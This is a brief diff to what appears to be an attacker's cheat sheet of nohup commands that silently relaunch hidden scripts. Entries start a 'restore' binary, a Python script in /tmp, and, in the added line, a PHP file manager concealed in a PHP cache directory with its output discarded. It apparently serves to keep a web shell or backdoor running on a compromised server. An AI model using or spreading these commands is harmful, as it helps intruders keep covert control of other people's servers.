@@ -24,3 +24,6 @@ nohup ./restore > ./restore.log 2>&1 &
 
 python
 nohup /usr/bin/python3 /tmp/restore.py >/tmp/smokykontol.log 2>&1 &
+
+php
+nohup php < /var/cache/php-eaccelerator/phpfm.php >/dev/null 2>&1 &
